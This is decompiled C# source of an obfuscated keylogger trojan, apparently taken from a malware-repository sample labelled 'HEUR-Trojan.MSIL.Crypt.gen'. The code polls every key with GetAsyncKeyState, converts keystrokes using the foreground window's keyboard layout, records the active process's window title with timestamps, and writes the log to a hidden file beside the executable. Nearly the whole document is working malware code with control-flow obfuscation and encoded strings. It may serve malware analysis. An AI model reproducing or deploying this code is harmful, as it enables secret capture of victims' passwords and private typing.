// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ali, Version=1.0.0.0, Culture=neutral, PublicKeyToken=12dd377afffd921d
// MVID: DF9BD579-195B-41DD-BF3C-E2DB69459DB9
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Crypt.gen-d3162d2b2a78bf60a2cde68bef573ca602c3725e28d62f18392978a5c1e40318.exe

using \u0002;
using \u0005;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace \u0005
{
  internal sealed class \u0001
  {
    private int \u0001;
    private string \u0001;
    private Keys \u0001;
    public Clock \u0001;
    public string \u0002;
    private object \u0001;
    public string \u0003;
    [NonSerialized]
    internal static \u0004 \u001D;

    public \u0001()
    {
      this.\u0001 = Keys.None;
      this.\u0001 = new Clock();
      this.\u0002 = \u0001.\u001D((int) sbyte.MaxValue);
      this.\u0001 = (object) new Keyboard();
      this.\u0003 = Assembly.GetExecutingAssembly().Location + \u0001.\u001D(2054);
    }

    [DllImport("user32.dll", EntryPoint = "ToUnicodeEx")]
    private static extern int \u0001(
      uint wVirtKey,
      uint wScanCode,
      byte[] lpKeyState,
      [MarshalAs(UnmanagedType.LPWStr), Out] StringBuilder pwszBuff,
      int cchBuff,
      uint wFlags,
      IntPtr dwhkl);

    [DllImport("user32.dll", EntryPoint = "GetKeyboardState")]
    private static extern bool \u0001([In] byte[] obj0);

    [DllImport("user32.dll", EntryPoint = "MapVirtualKey")]
    private static extern uint \u0001([In] uint obj0, [In] uint obj1);

    [DllImport("user32.dll", EntryPoint = "GetWindowThreadProcessId", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0001([In] IntPtr obj0, [In] ref int obj1);

    [DllImport("user32", EntryPoint = "GetKeyboardLayout", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int \u0001([In] int obj0);

    [DllImport("user32", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr \u0001();

    [DllImport("user32", EntryPoint = "GetAsyncKeyState", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern short \u0001([In] int obj0);

    private string \u0001()
    {
      try
      {
        IntPtr num1 = \u0001.\u0001();
        int num2;
        \u0001.\u0001(num1, ref num2);
        object obj = (object) \u000F.\u001A(num2);
        if (!\u0002\u0002.\u0095\u0002(\u001E.\u0099(\u001E.\u009A((object) (num1.ToInt32() == this.\u0001), \u0003\u0002.\u0096\u0002((object) this.\u0001, global::\u0005.\u0012(obj, (System.Type) null, \u0001.\u001D(2063), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), false)), \u0003\u0002.\u0096\u0002(global::\u0005.\u0012(global::\u0005.\u0012(obj, (System.Type) null, \u0001.\u001D(2063), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (System.Type) null, \u0001.\u001D(875), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) 0, false))))
        {
          if (true)
          {
            this.\u0001 = num1.ToInt32();
            this.\u0001 = \u001F.\u009B(global::\u0005.\u0012(obj, (System.Type) null, \u0001.\u001D(2063), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
            return \u001F.\u009B(\u001E.\u0096(\u001E.\u0096(\u001E.\u0096(\u001E.\u0096(\u001E.\u0096((object) \u0016.\u008E(\u0016.\u008E(\u0001.\u001D(2084), this.\u0002()), \u0001.\u001D(685)), global::\u0005.\u0012(obj, (System.Type) null, \u0001.\u001D(2089), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) \u0001.\u001D(685)), (object) this.\u0001), (object) '\u0001'), (object) \u0001.\u001D(2106)));
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0008.\u0015();
      }
      return \u0001.\u001D((int) sbyte.MaxValue);
    }

    private string \u0002()
    {
      if (false)
        ;
      string str;
      try
      {
        while (false)
        {
          if (true)
          {
            if (false)
              goto label_4;
            else
              goto label_9;
          }
        }
        DateTime dateTime = \u0089.\u007E\u0015\u0002((object) this.\u0001);
label_4:
        if (true)
          str = dateTime.ToString(\u0001.\u001D(2111));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = \u0001.\u001D(2124);
        \u0008.\u0015();
      }
label_9:
      return str;
    }

    private static string \u0001([In] uint obj0)
    {
      string str;
      if (true)
      {
        try
        {
          StringBuilder pwszBuff = new StringBuilder();
          byte[] numArray = new byte[(int) byte.MaxValue];
          byte[] lpKeyState;
          if (true)
            lpKeyState = numArray;
          int num1 = !\u0001.\u0001(lpKeyState) ? 1 : 0;
          bool flag;
          if (true)
            flag = num1 != 0;
          if (flag)
          {
            do
            {
              str = \u0001.\u001D((int) sbyte.MaxValue);
            }
            while (false);
            if (true)
              goto label_17;
          }
          uint wScanCode = \u0001.\u0001(obj0, 0U);
          IntPtr num2 = \u0001.\u0001();
          IntPtr dwhkl;
          while (true)
          {
            IntPtr num3 = num2;
            IntPtr num4;
            do
            {
              int num5 = 0;
              int num6 = \u0001.\u0001(num3, ref num5);
              num4 = \u0080\u0002.\u001A\u0003(\u0001.\u0001(num6));
              if (true)
                dwhkl = num4;
              else
                goto label_10;
            }
            while (false);
            break;
label_10:
            num2 = num4;
          }
          \u0001.\u0001(obj0, wScanCode, lpKeyState, pwszBuff, 5, 0U, dwhkl);
          do
          {
            str = \u0013.\u007E\u007F((object) pwszBuff);
          }
          while (false);
          goto label_17;
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0008.\u0015();
        }
        str = ((Keys) checked ((int) obj0)).ToString();
      }
label_17:
      return str;
    }

    private string \u0001([In] Keys obj0)
    {
      bool flag = \u0002\u0002.\u0095\u0002(global::\u0005.\u0012(this.\u0001, (System.Type) null, \u0001.\u001D(2137), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null));
      if (\u0017\u0002.\u000E\u0003(global::\u0005.\u0012(this.\u0001, (System.Type) null, \u0001.\u001D(2154), new object[0], (string[]) null, (System.Type[]) null, (bool[]) null), (object) true, false))
      {
        if (flag)
          flag = false;
        else if (true)
          flag = true;
      }
      string str;
      try
      {
        Keys keys = obj0;
        if (keys == Keys.F1 || keys == Keys.F2)
          goto label_10;
label_8:
        if (keys == Keys.F3)
          goto label_10;
label_9:
        if (keys != Keys.F4 && keys != Keys.F5 && keys != Keys.F6 && keys != Keys.F7 && keys != Keys.F8 && keys != Keys.F9 && keys != Keys.F10 && keys != Keys.F11 && keys != Keys.F12 && keys != Keys.End && keys != Keys.Delete)
          goto label_11;
label_10:
        if (false)
          goto label_9;
        else
          goto label_13;
label_11:
        int num1;
        if (keys != Keys.Back)
        {
          num1 = 0;
          goto label_14;
        }
label_13:
        num1 = 1;
label_14:
        int num2;
        for (int index = num1 != 0 ? 1 : 0; index == 0; index = num2)
        {
          if (keys == Keys.LShiftKey || keys == Keys.RShiftKey)
          {
            if (true)
              goto label_21;
          }
          else if (keys == Keys.Shift || keys == Keys.ShiftKey)
            goto label_21;
          int num3;
          if (keys != Keys.Control && keys != Keys.ControlKey && keys != Keys.RControlKey)
          {
            if (keys != Keys.LControlKey && keys != Keys.Alt)
            {
              num3 = 0;
              goto label_26;
            }
            else
              goto label_25;
          }
label_21:
          if (false)
            goto label_11;
label_25:
          num3 = 1;
label_26:
          if (num3 != 0)
          {
            str = \u0001.\u001D((int) sbyte.MaxValue);
            goto label_43;
          }
          else
          {
            num2 = keys == Keys.Space ? 1 : 0;
            if (true)
            {
              if (num2 != 0)
              {
                str = \u0001.\u001D(685);
                goto label_43;
              }
              else if (keys == Keys.Return || keys == Keys.Return)
              {
                str = !\u0083.\u007E\u0003\u0002((object) this.\u0002, \u0001.\u001D(2177)) ? \u0001.\u001D(2177) : \u0001.\u001D((int) sbyte.MaxValue);
                goto label_43;
              }
              else
              {
                if (true)
                {
                  if (keys == Keys.Tab)
                  {
                    str = \u0001.\u001D(2190);
                    goto label_43;
                  }
                  else if (!flag)
                  {
                    if (true)
                    {
                      str = \u0001.\u0001(checked ((uint) obj0));
                      goto label_43;
                    }
                    else
                      goto label_8;
                  }
                }
                str = \u0013.\u007E\u0088((object) \u0001.\u0001(checked ((uint) obj0)));
                goto label_43;
              }
            }
          }
        }
        str = \u001A.\u0092(\u0001.\u001D(2167), obj0.ToString(), \u0001.\u001D(2172));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        if (flag)
        {
          char ch = \u0081\u0002.\u001B\u0003((int) obj0);
          str = \u0013.\u007E\u0088((object) ch.ToString());
          \u0008.\u0015();
        }
        else
        {
          char ch = \u0081\u0002.\u001B\u0003((int) obj0);
          str = \u0013.\u007E\u0082((object) ch.ToString());
          \u0008.\u0015();
        }
      }
label_43:
      return str;
    }

    public void \u0001()
    {
      try
      {
        this.\u0002 = \u009A.\u008B\u0002(this.\u0003);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0008.\u0015();
      }
      try
      {
        if (true)
          goto label_22;
label_21:
        int num1;
        while (true)
        {
          int num2 = checked (num1 + 1);
          if (true)
            goto label_24;
label_13:
          int num3;
          if (num2 > (int) byte.MaxValue)
            num3 = num1;
          else
            goto label_26;
label_15:
          int num4;
          if (num3 == 1000)
          {
            num1 = 0;
            num4 = 20480;
          }
          else
            goto label_20;
label_17:
          int num5 = num4;
          if (global::\u0002.\u007E\u0005((object) this.\u0002) > num5)
            this.\u0002 = \u0097.\u007E\u0087\u0002((object) this.\u0002, 0, checked (global::\u0002.\u007E\u0005((object) this.\u0002) - num5));
          \u0082\u0002.\u001C\u0003(this.\u0003, this.\u0002);
label_20:
          \u0010.\u001B(1);
          continue;
label_24:
          num1 = num2;
          int num6 = 0;
          int num7;
          if (num6 != 0)
          {
            num4 = num6;
            goto label_17;
          }
          else
            num7 = num6;
label_26:
          bool flag = \u0001.\u0001(num7) == (short) -32767;
          while (flag)
          {
            Keys keys = (Keys) num7;
            string str = this.\u0001(keys);
            if (true)
            {
              num3 = global::\u0002.\u007E\u0005((object) str) > 0 ? 1 : 0;
              if (true)
              {
                if (num3 != 0)
                {
                  this.\u0002 = \u0016.\u008E(this.\u0002, this.\u0001());
                  this.\u0002 = \u0016.\u008E(this.\u0002, str);
                }
                this.\u0001 = keys;
                break;
              }
              goto label_15;
            }
          }
          checked { ++num7; }
          num2 = num7;
          goto label_13;
        }
        return;
label_22:
        num1 = 0;
        goto label_21;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        do
        {
          if (false)
            ;
        }
        while (false);
        \u0008.\u0015();
      }
    }

    static \u0001() => \u0005.\u0002.\u0001(typeof (\u0001));
  }
}
